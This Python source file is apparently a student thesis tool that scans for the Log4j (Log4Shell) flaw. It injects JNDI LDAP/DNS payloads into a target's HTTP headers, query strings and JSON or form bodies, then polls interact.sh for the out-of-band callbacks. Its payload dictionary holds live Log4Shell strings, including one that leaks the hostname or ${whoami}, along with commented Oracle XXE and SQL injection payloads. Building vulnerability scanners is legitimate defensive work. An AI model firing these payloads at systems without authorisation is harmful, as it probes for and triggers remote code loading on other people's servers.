from urllib.parse import urlparse, parse_qs, urlencode , quote
import requests
import argparse
from termcolor import colored, cprint
from flatten_json import flatten, unflatten_list
import re
import sys
import string
import json
from flatten_json  import flatten, unflatten_list
import random
from concurrent.futures import ThreadPoolExecutor
from Crypto.PublicKey import RSA
import uuid, base64
from Crypto.Cipher import PKCS1_OAEP, AES
from Cryptodome.Hash import SHA256
import time

requests.packages.urllib3.disable_warnings()
HTTP_PROXY = {
}
interact_url = None
payloads = {
    # "ORACLE_SQLi_DNS_1": """(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ceqxd SYSTEM "http://__BURP_COLLABORATOR__/">%ceqxd;]>'),'/l') from dual)""",
    # "MSACCESS_Check_Type_2": """' and cdbl(1)=cdbl(1)""",
    # "log4j_cve1": """${jndi:ldap://${hostName}.__interactsh_url__/a}""",
    # "log4j_cve2": """${jndi:ldap://${hostName}.accept.__interactsh_url__}""",
    # "log4j_cve3": """${jndi:ldap://${hostName}.acceptencoding.__interactsh_url__}""",
    # "log4j_cve4": """${jndi:ldap://${hostName}.acceptlanguage.__interactsh_url__}""",
    # "log4j_cve5": """${jndi:ldap://${hostName}.accesscontrolrequestheaders.__interactsh_url__}""",
    # "log4j_cve6": """${jndi:ldap://${hostName}.accesscontrolrequestmethod.__interactsh_url__}""",
    # "log4j_cve7": """${jndi:ldap://${hostName}.authenticationbasic.__interactsh_url__}""",
    # "log4j_cve8": """${jndi:ldap://${hostName}.authenticationbearer.__interactsh_url__}""",
    # "log4j_cve9": """${jndi:ldap://${hostName}.cookiename.__interactsh_url__}=${jndi:ldap://${hostName}.cookievalue.__interactsh_url__}""",
    # "log4j_cve10": """${jndi:ldap://${hostName}.location.__interactsh_url__}""",
    # "log4j_cve11": """${jndi:ldap://${hostName}.origin.__interactsh_url__}""",
    # "log4j_cve12": """${jndi:ldap://${hostName}.referer.__interactsh_url__}""",
    # "log4j_cve13": """${jndi:ldap://${hostName}.upgradeinsecurerequests.__interactsh_url__}""",
    # "log4j_cve14": """${jndi:ldap://${hostName}.useragent.__interactsh_url__}""",
    # "log4j_cve15": """${jndi:ldap://${hostName}.xapiversion.__interactsh_url__}""",
    # "log4j_cve16": """${jndi:ldap://${hostName}.xcsrftoken.__interactsh_url__}""",
    # "log4j_cve17": """${jndi:ldap://${hostName}.xdruidcomment.__interactsh_url__}""",
    # "log4j_cve18": """${jndi:ldap://${hostName}.xforwardedfor.__interactsh_url__}""",
    # "log4j_cve19": """${jndi:ldap://${hostName}.xorigin.__interactsh_url__}""",
    # "log4j_cve20" : """${jndi:ldap://${hostName}.__interactsh_url__/a}""",
    # "log4j_cve21" : """${jndi:ldap://127.0.0.1#.${hostName}.__interactsh_url__/a}"""
    "log4j_cve11": """${jndi:ldap://${hostName}.origin.__param__.__interactsh_url__}""", 
    # "log4j_cve12": """${jndi:ldap://${hostName}.referer.__interactsh_url__}""", 
    # "log4j_cve13": """${jndi:ldap://${hostName}.upgradeinsecurerequests.__interactsh_url__}""", 
    # "log4j_cve14": """${jndi:ldap://${hostName}.useragent.__interactsh_url__}""", 
    # "log4j_cve15": """${jndi:ldap://${hostName}.xapiversion.__interactsh_url__}""", 
    # "log4j_cve16": """${jndi:ldap://${hostName}.xcsrftoken.__interactsh_url__}""", 
    # "log4j_cve17": """${jndi:ldap://${hostName}.xdruidcomment.__interactsh_url__}""", 
    # "log4j_cve18": """${jndi:ldap://${hostName}.xforwardedfor.__interactsh_url__}""", 
    # "log4j_cve19": """${jndi:ldap://${hostName}.xorigin.__interactsh_url__}""", 
    # "log4j_cve20" : """${jndi:ldap://${hostName}.__interactsh_url__/a}""", 
    "log4j_cve21" : """${jndi:ldap://127.0.0.1#.${hostName}.__param__.__interactsh_url__/a}""", 
    # "log4j_cve1": """${jndi:ldap://${hostName}.__interactsh_url__/a}""", 
    # "log4j_cve2": """${jndi:ldap://${hostName}.accept.__interactsh_url__}""", 
    # "log4j_cve3": """${jndi:ldap://${hostName}.acceptencoding.__interactsh_url__}""", 
    # "log4j_cve4": """${jndi:ldap://${hostName}.acceptlanguage.__interactsh_url__}""", 
    # "log4j_cve5": """${jndi:ldap://${hostName}.accesscontrolrequestheaders.__interactsh_url__}""", 
    # "log4j_cve6": """${jndi:ldap://${hostName}.accesscontrolrequestmethod.__interactsh_url__}""", 
    # "log4j_cve7": """${jndi:ldap://${hostName}.authenticationbasic.__interactsh_url__}""",
    # "log4j_cve8": """${jndi:ldap://${hostName}.authenticationbearer.__interactsh_url__}""", 
    # "log4j_cve9": """${jndi:ldap://${hostName}.cookiename.__interactsh_url__}=${jndi:ldap://${hostName}.cookievalue.__interactsh_url__}""",
    # "log4j_cve10": """${jndi:ldap://${hostName}.location.__interactsh_url__}""",
    # "log4j_cve22" : """${jndi:dns://${whoami}.__param__.__interactsh_url__}""" 
}
thread = 10
url = None

requestFilePath = "D:\\FPT LEARNING\\Graduation Thesis\\Scanner\\My tool\\req.txt" 

defaultHeader = {
    "User-Agent": "__PAYLOAD__",
    "X-Forwarded-For": "__PAYLOAD__",
    "X-Api-Version": "__PAYLOAD__",
    "X-Real-Ip": "__PAYLOAD__",
    "Via": "1.1 __PAYLOAD__",
    "X-Wap-Profile": "http://__PAYLOAD__",
    "Proxy": "http://__PAYLOAD__",
    "Forwarded": "__PAYLOAD__",
    "X-Host": "__PAYLOAD__",
    "Destination": "__PAYLOAD__",
    "Referer": "http://__PAYLOAD__",
    "X-Originating-Ip": "__PAYLOAD__",
    "X-Arbitrary": "http://__PAYLOAD__",
    "True-Client-Ip": "__PAYLOAD__",
    "Client-Ip": "__PAYLOAD__",
    "X-Original-Url": "http://__PAYLOAD__",
    "From": "root@__PAYLOAD__",
    "X-Http-Destinationurl": "http://__PAYLOAD__",
    "X-Forwarded-Server": "__PAYLOAD__",
    "Profile": "http://__PAYLOAD__",
    "X-Client-Ip": "__PAYLOAD__",
    "Contact": "__PAYLOAD__",
    "Proxy-Host": "__PAYLOAD__",
    "Cf-Connecting_ip": "__PAYLOAD__",
    "X-Forwarded-Proto": "http://__PAYLOAD__"
}
modeList = {
    "1": "injectAll",
    "2": "injectAllSequently"
}
mode = "1"
excludedHeader = ["connection", "content-length", "host", "accept", "accept-encoding"]
isGetMethod = True
query = None
headerDict = None
reqBody = None


class requestHandling:
    def sendPostRequest(headers, body, params):
        session = requests.Session()
        session.proxies.update(HTTP_PROXY)
        session.verify = False
        session.allow_redirects = True
        r = session.post(url=url, headers=headers, data=body, params=params,timeout=30)

    def sendGetRequest(headers, body, params):
        session = requests.Session()
        session.proxies.update(HTTP_PROXY)
        session.verify = False
        session.allow_redirects = True
        r = session.get(url=url, headers=headers, data=body, params=params, timeout=30)    


class util:
    def checkExistedHeader(headersInFile):
        if isinstance(headersInFile, dict):
            listParam = list(headersInFile.keys())
            listDefaultParam = list(defaultHeader.keys())
            for param in listParam:
                if param.lower()=="user-agent":
                    defaultHeader["User-Agent"] = headersInFile[param] + " " + defaultHeader["User-Agent"]
                elif param not in listDefaultParam and param.lower() not in excludedHeader:
                    defaultHeader[param] = headersInFile[param] + " __PAYLOAD__"
        else:
            print("headersInFile ko phai la dict object")


    def analystRequestFile(filePath):
        isGetMethod = False
        existBody = False
        query = None
        global url
        schema = None
        host = None
        f = open(filePath, "r")
        req = f.read()
        firstLine = req.split('\n')[0]
        if  firstLine.upper().endswith("HTTP/2"):
            schema = "https://"
        else:
            schema = "http://"
        path = firstLine.strip().split()[1]
        
        if re.search("^(GET)(\s+)[//]", firstLine):
            isGetMethod = True
        elif re.search("^(POST)(\s+)[//]", firstLine):
            isGetMethod = False
        else:
            print("Khong ho tro method khác GET|POST")
            exit()
            
        if len(req.split("\n\n")) > 1 and req.split("\n\n")[1].strip():
            existBody = True
            
        reqHeader = req.split("\n\n")[0]
        
        for line in reqHeader.split("\n"):
            if line.lower().startswith("host"):
                host = line[line.find(':')+1:].strip()
                break
        if schema and path and host:
            url = schema+host+path
        else:
            print("co loi voi schema, host hoac path")
            exit()
        
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)
            
        headerDict = dict()
        for line in reqHeader.split("\n"):
            if not line.startswith("POST") and not line.startswith("GET"):
                headerDict[line.split(":")[0]] =  line.split(":")[1].strip()
                    
        if  existBody:
            lastStringHeader = reqHeader[-20:]
            reqBody = req.split(lastStringHeader + "\n\n")[1]
            return isGetMethod, query, headerDict, reqBody
        
        else : 
            return isGetMethod, query, headerDict

    def parseBody(stringBody):
        isJsonBody = False
        if isinstance(stringBody, str):
            if stringBody.strip().startswith("{") and stringBody.strip().endswith("}"):
                try:
                    jsonBody = json.loads(stringBody)
                    jsonBody = flatten(jsonBody, "||")
                    isJsonBody = True
                    return jsonBody, isJsonBody
                except:
                    print("invalid json")
                    exit()
            else:
                temp = "?" + stringBody
                parsed_url = urlparse(temp)
                captured_value = parse_qs(parsed_url.query)
                isJsonBody = False
                return captured_value, isJsonBody
        else:
            print("body is not a string")
            exit()

    def runner(dataReqList):
        threads= []
        with ThreadPoolExecutor(max_workers=thread) as executor:
            if isGetMethod:
                for dataReq in dataReqList:
                    threads.append(executor.submit(requestHandling.sendGetRequest, dataReq["header"], dataReq["body"], dataReq["query"]))
            else:
                for dataReq in dataReqList:
                    threads.append(executor.submit(requestHandling.sendPostRequest, dataReq["header"], dataReq["body"], dataReq["query"]))

def replaceUrlPayload(interact_url, payloadDict):
    for namePayload, payload in payloadDict.items():
        if payload.find("__interactsh_url__") > -1:
            payloadDict[namePayload] = payload.replace("__interactsh_url__", namePayload + "." + interact_url)
    

class userInteraction:
    def argument():
        description = "Xin chao, day la tool log4j"
        parser = argparse.ArgumentParser(description=description)
        parser.add_argument("-v", "--verbose", help="Verbose information.", required=False, action="store_true")
        parser.add_argument("--url", "-u", help="Specify a URL for the request.", required=False)
        parser.add_argument("--proxy", help="Use a proxy to connect to the target URL (e.g. \"http://127.0.0.1:8080\").", required=False)
        parser.add_argument("--mode", "-m", help="--mode 1: Inject each payload to all headers and data. | --mode 2: (Advance mode) Injects payload to headers and data sequently (Default mode=1)", required=False)
        parser.add_argument("--file", "-f", help="specify the path of file which contains the request.", required=False)
        parser.add_argument("--headers", help="Specify custom header(s) (e.g. \"header1: value1\\nheader2: value2\").", required=False)
        parser.add_argument("--data", "-d",help="HTTP body (e.g. \"user=admin&pass=123\" or '{\\\"user\\\":\\\"admin\\\",\\\"pass\\\":\\\"123\\\"}').", required=False)
        parser.add_argument("--method", help="Specify GET or POST request method (default GET).", required=False)
        parser.add_argument("--interact-server", "-iserver", help="Specific an interact server (e.g. \"9u4ke6r6cn1gd1ctp40haucjlar0fp.burpcollaborator.net\").", required=False)
        parser.add_argument("--thread", "-t", help="Max number of concurrent HTTP(s) requests (default 10)", required=False)
        args = parser.parse_args()
        return args

    def argumentHandling(args):
        global requestFilePath, isGetMethod, headerDict, reqBody, url, query, interact_url, thread, HTTP_PROXY
        if args.verbose:
            print("Enabling verbose mode")
        if args.file:
            requestFilePath = args.file
            dataList = list()
            dataList = util.analystRequestFile(requestFilePath)
            if len(dataList) == 4:
                isGetMethod = dataList[0]
                query = dataList[1]
                headerDict = dataList[2]
                reqBody = dataList[3]
            else:
                isGetMethod = dataList[0]
                query = dataList[1]
                headerDict = dataList[2]    
            if query:
                url = url[:url.find('?')]
            util.checkExistedHeader(headerDict)
        if args.proxy:
            HTTP_PROXY = {
                "http": args.proxy,
                "https": args.proxy
            }        
            print("Enable proxy " + args.proxy)
        if args.url:
            headerDict = dict()
            headerDict["User-Agent"] = "Chrome"
            url = args.url
            parsed_url = urlparse(url)
            
            query = parse_qs(parsed_url.query)
            if query:
                url = url[:url.find('?')]
        if args.headers:
            temp = dict()
            for header in args.headers.split("\\n"):
                param = header.split(":")[0].strip()
                value = header.split(":")[1].strip()
                temp[param] = value 
            headerDict.update(temp)
            util.checkExistedHeader(headerDict)

        if args.data:
            reqBody = args.data
        if args.mode:
            global mode
            if args.mode=="1" or args.mode=="2":
                mode = args.mode
            else: 
                print("Vui long nhap mode 1 hoac 2")
                exit()
        if args.method:
            if args.method.lower()=="post":
                isGetMethod = False
            elif args.method.lower()=="get":
                isGetMethod = True
            else:
                print("Chi ho tro GET va POST")
                exit()
        if args.interact_server:
            interact_url = args.interact_server    
        if args.thread:
            thread = int(args.thread)

class scanner:
    def scanLog4j():    
        bodyReqs = dict()
        if reqBody:
            parsedBody, isJsonBody = util.parseBody(reqBody)
        if modeList[mode] == "injectAll":
            headerReqs = customModeInjection.injectPayloadToAllHeader(defaultHeader)        
            queryReqs = customModeInjection.injectPayloadToAllDictQuery(query)
            if reqBody:
                if isJsonBody:
                    bodyReqs = customModeInjection.injectPayloadToAllJson(parsedBody)
                else:
                    bodyReqs = customModeInjection.injectPayloadToAllDictQuery(parsedBody)    
                    stringBodyReqs = customModeInjection.injectPayloadToAllStringQuery(parsedBody)
                    for body in stringBodyReqs:
                        temp = dict()
                        temp["header"] = headerDict
                        temp["body"] = body
                        temp["query"] = query
                        yield temp
        
                for (header,body,qry) in zip(headerReqs, bodyReqs, queryReqs):
                    temp = dict()
                    temp["header"] = header
                    temp["body"] = body
                    temp["query"] = qry
                    yield temp
            
            else:
                for (header,qry) in zip(headerReqs, queryReqs):
                    print()
                    temp = dict()
                    temp["header"] = header
                    temp["body"] = reqBody
                    temp["query"] = qry
                    yield temp               
        
        elif modeList[mode] == "injectAllSequently":
            headerReqs = customModeInjection.injectPayloadToAllHeader(defaultHeader)
            for header in headerReqs:
                temp = dict()
                temp["header"] = header
                temp["body"] = reqBody
                temp["query"] = query
                yield temp
            queryReqs = customModeInjection.injectPayloadToDictQuerySequently(query)
            for qry in queryReqs:
                temp = dict()
                temp["header"] = headerDict
                temp["body"] = reqBody
                temp["query"] = qry
                yield temp      
            if headerDict:
                headerReqs = customModeInjection.injectPayloadToHeaderSequently(headerDict)
                for header in headerReqs:
                    temp = dict()
                    temp["header"] = header
                    temp["body"] = reqBody
                    temp["query"] = query
                    yield temp
            if reqBody:
                if isJsonBody:
                    bodyReqs = customModeInjection.injectPayloadToJsonSequently(parsedBody)
                    for body in bodyReqs:
                        temp = dict()
                        temp["header"] = headerDict
                        temp["body"] = body
                        temp["query"] = query
                        yield temp                
                else:
                    bodyReqs = customModeInjection.injectPayloadToDictQuerySequently(parsedBody)
                    stringBodyReqs = customModeInjection.injectPayloadToStringQuerySequently(parsedBody)
                    for body in bodyReqs:
                        temp = dict()
                        temp["header"] = headerDict
                        temp["body"] = body
                        temp["query"] = query
                        yield temp                     
                    for body in stringBodyReqs:
                        temp = dict()
                        temp["header"] = headerDict
                        temp["body"] = body
                        temp["query"] = query
                        yield temp 

class customModeInjection:
    def injectPayloadToAllHeader(dictHeader):
        if isinstance(dictHeader, dict):
            for namePayload, payload in payloads.items():
                injectedHeaders = dict()
                for param,value in dictHeader.items():                
                    if payload.find("__param__") > -1:
                        payload = payloads[namePayload].replace("__param__", param)
                    if value.find("__PAYLOAD__") > -1:
                        value = value.replace("__PAYLOAD__", payload)
                        payload = payloads[namePayload]
                    injectedHeaders[param] = value
                yield injectedHeaders
        else:
            print("Khong phai la dict object")
    def injectPayloadToAllStringQuery(dictQuery):
        if not dictQuery:
            dictQuery = {'id': ['']}
        if isinstance(dictQuery, dict):
            for namePayload, payload in payloads.items():
                injectedUrl = dict()
                for param,value in dictQuery.items():
                    if payload.find("__param__") > -1:
                        payload = payloads[namePayload].replace("__param__", param)
                    temp = list()
                    for x in range(len(value)):
                        temp.append(str(value[x]) + " " + payload)
                    injectedUrl[param] = temp
                    injectedUrlList = []
                    for key,value in injectedUrl.items():
                        for element in value:
                            injectedUrlList.append(key+"="+element)
                    stringQuery = "&".join(injectedUrlList)
                    payload = payloads[namePayload]
                yield stringQuery
        else:
            print("Khong phai la dict object")

    def injectPayloadToAllDictQuery(dictQuery):
        if not dictQuery:
            dictQuery = {'id': ['']}
        if isinstance(dictQuery, dict):
            for namePayload, payload in payloads.items():
                injectedUrl = dict()
                for param,value in dictQuery.items():
                    if payload.find("__param__") > -1:
                        payload = payloads[namePayload].replace("__param__", param)
                    temp = list()
                    for x in range(len(value)):
                        temp.append(str(value[x]) + " " + payload)
                    payload = payloads[namePayload]                    
                    injectedUrl[param] = temp
                yield injectedUrl
        else:
            print("Khong phai la dict object")
        
    def injectPayloadToDictQuerySequently(dictQuery):
        if not dictQuery:
            dictQuery = {'id': ['']}
        if isinstance(dictQuery, dict):
            for param, value in dictQuery.items():
                for pos in range(len(value)):
                    for namePayload, payload in payloads.items():
                        if payload.find("__param__") > -1:
                            payload = payloads[namePayload].replace("__param__", param)
                        injectedUrl = dictQuery.copy()
                        for x,y in dictQuery.items():
                            temp = y.copy()
                            injectedUrl[x] = temp
                        injectedUrl[param][pos] = str(injectedUrl[param][pos]) + " " + payload 
                        yield injectedUrl
        else:
            print("Input is not json")
            exit()   

    def injectPayloadToStringQuerySequently(dictQuery):
        if not dictQuery:
            dictQuery = {'id': ['']}
        if isinstance(dictQuery, dict):
            for param, value in dictQuery.items():
                for pos in range(len(value)):
                    for namePayload, payload in payloads.items():
                        if payload.find("__param__") > -1:
                            payload = payloads[namePayload].replace("__param__", param)
                        injectedUrl = dictQuery.copy()
                        for x,y in dictQuery.items():
                            temp = y.copy()
                            injectedUrl[x] = temp
                        injectedUrl[param][pos] = str(injectedUrl[param][pos]) + " " + payload

                        injectedUrlList = []
                        for key,value in injectedUrl.items():
                            for element in value:
                                injectedUrlList.append(key+"="+element)
                        stringQuery = "&".join(injectedUrlList)
                        yield stringQuery
                                            
        else:
            print("Input is not json")
            exit()
        

    def injectPayloadToAllJson(dictJson):
        if isinstance(dictJson, dict):
            for namePayload, payload in payloads.items():
                injectedJson = dict()
                for param,value in dictJson.items():
                    if payload.find("__param__") > -1:
                        payload = payloads[namePayload].replace("__param__", param)
                    value = value + " " + payload                  
                    injectedJson[param] = value
                    payload = payloads[namePayload]
                injectedJson = unflatten_list(injectedJson, "||")
                dumpJson = json.dumps(injectedJson) 
                yield dumpJson
        else:
            print("Input is not json")
            exit()

    def injectPayloadToJsonSequently(dictJson):
        if isinstance(dictJson, dict):
            for param, value in dictJson.items():
                for namePayload, payload in payloads.items():
                    if payload.find("__param__") > -1:
                        payload = payloads[namePayload].replace("__param__", param)
                    temp = dictJson.copy()
                    temp[param] = str(value) + " " + payload
                    temp = unflatten_list(temp, "||")
                    dumpJson = json.dumps(temp)
                    yield dumpJson
        else:
            print("Input is not json")
            exit()    

    def injectPayloadToHeaderSequently(dictHeader):
        d = list()
        if isinstance(dictHeader, dict):
            for param, value in dictHeader.items():
                if param.lower() not in excludedHeader:
                    if value.find("__PAYLOAD__") > -1:
                        dictHeader[param] = value.replace("__PAYLOAD__", "")
            for param, value in dictHeader.items():
                if param.lower() not in excludedHeader:
                    for namePayload, payload in payloads.items():
                        if payload.find("__param__") > -1:
                            payload = payloads[namePayload].replace("__param__", param)
                        temp = dictHeader.copy()
                        temp[param] = temp[param] + " " + payload
                        yield temp
        else:
            print("Khong phai la dict object")    

class interactsh:
    def __init__(self):
        self.server = "interact.sh"
        self.key = RSA.generate(2048)
        self.pubkey = self.key.publickey().exportKey()
        self.privateKey = self.key.exportKey()
        self.secret = str(uuid.uuid4())
        self.subdomain = ''.join(random.choice(string.ascii_lowercase + string.digits) for i in range(33))
        self.correlation = self.subdomain[:20]
        self.public_key = base64.b64encode(self.pubkey).decode()
         
    def register(self):
        data = {"public-key": self.public_key, 
               "secret-key": self.secret,
               "correlation-id": self.correlation}
        session = requests.Session()
        session.proxies.update(HTTP_PROXY)
        session.verify = False
        session.allow_redirects = True
        r = session.post(url="https://interact.sh/register", json=data, timeout=30)
        if "registration successful" in r.content.decode():
            global interact_url
            interact_url = self.subdomain + "." + self.server
            print("Registered interactsh successfully")
        else:
            print("Registered fail")
            exit()    
    
    def pollData(self):
        query = "id={}&secret={}".format(self.correlation,self.secret)
        session = requests.Session()
        session.proxies.update(HTTP_PROXY)
        session.verify = False
        session.allow_redirects = True
        r = session.get(url="https://interact.sh/poll?"+query, timeout=30)
        resJson = r.json()
        data = resJson["data"]
        aes_key = resJson["aes_key"]
        return data, aes_key

    def decryptAESKey(self, aes_Key):
        privateKey = RSA.importKey(self.privateKey)
        rsakey = PKCS1_OAEP.new(key=privateKey, hashAlgo=SHA256)
        raw_aesKey = base64.b64decode(aes_Key)
        decryptedAesKey = rsakey.decrypt(raw_aesKey)
        return base64.b64encode(decryptedAesKey).decode()
    
    def decryptMessage(self, aes_Key, dataList):
        if dataList:
            for data in dataList:
                iv = base64.b64decode(data)[:16]
                key = base64.b64decode(aes_Key)
                cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
                plainText = cipher.decrypt(base64.b64decode(data)[16:])
                yield json.loads(plainText)
        else:
            print("khong co data")

class result:
    def __init__(self, resposne, dataOOB): 
       self.response = resposne
       self.dataOOB =  dataOOB
    
    def parsedDataOOB(self):
        server = "interact.sh"
        if self.dataOOB:
            count = 1
            for data in self.dataOOB:
                host = data["full-id"]+"."+server
                payloadCode = host.split(".")[-4]
                param = host.split(".")[-5]
                print("ID: {}| Time: {}| Type: {}| IP: {}| Param: {}|  Payload Code: {}| Host: {}".format(colored(str(count).ljust(4), "blue"), colored(data["timestamp"].ljust(33), "blue"), colored(data["protocol"].ljust(6), "blue"), colored(data["remote-address"].ljust(17), "blue"), colored(param.ljust(23), "blue"), colored(payloadCode.ljust(12), "blue"),colored(host, "blue")))                    
                count+=1
        else:
            print("Khong co data tra ve")
            exit()
        
       

def main():
    args = userInteraction.argument()
    userInteraction.argumentHandling(args)
    interact = interactsh()
    interact.register()
    replaceUrlPayload(interact_url, payloads)
    dataReqList = scanner.scanLog4j()
    util.runner(dataReqList)
    time.sleep(10)
    data, aes_key = interact.pollData()
    key = interact.decryptAESKey(aes_key)
    dataList = interact.decryptMessage(key,data)
    resultLog4j = result(resposne = None, dataOOB = dataList)
    resultLog4j.parsedDataOOB()
  
if __name__ == "__main__":
    main()


